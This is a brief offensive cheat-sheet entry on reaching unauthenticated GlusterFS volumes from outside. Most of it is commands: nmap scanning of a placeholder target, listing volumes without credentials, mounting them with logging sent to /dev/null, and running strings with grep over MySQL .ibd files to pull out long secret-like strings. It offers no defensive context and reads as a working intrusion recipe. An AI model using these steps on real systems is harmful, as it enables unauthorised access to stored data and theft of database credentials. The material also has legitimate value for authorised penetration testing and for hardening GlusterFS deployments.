# GlusterFS Unauthenticated Volume Mount

GlusterFS volumes are accessible without authentication by default if not locked down. Mount directly from an external client to read/write files.

```bash
# Detect GlusterFS (port 24007 TCP + 49152+ ephemeral)
nmap -p 24007,49152-49200 <TARGET>

# List volumes (no auth)
gluster --remote-host=<TARGET> volume list

# Mount a volume
mount -t glusterfs <TARGET>:/vol_name /mnt/gluster
ls /mnt/gluster

# If mount binary unavailable, use gfapi via Python or glusterfs FUSE
mount -t glusterfs <TARGET>:/vol_name /mnt -o log-file=/dev/null
```

Read MySQL datafiles directly if the volume holds `/var/lib/mysql`:
```bash
# Copy .frm/.ibd files and read with local MySQL or strings
strings /mnt/gluster/mysql/users.ibd | grep -E '[a-zA-Z0-9]{20,}'
```
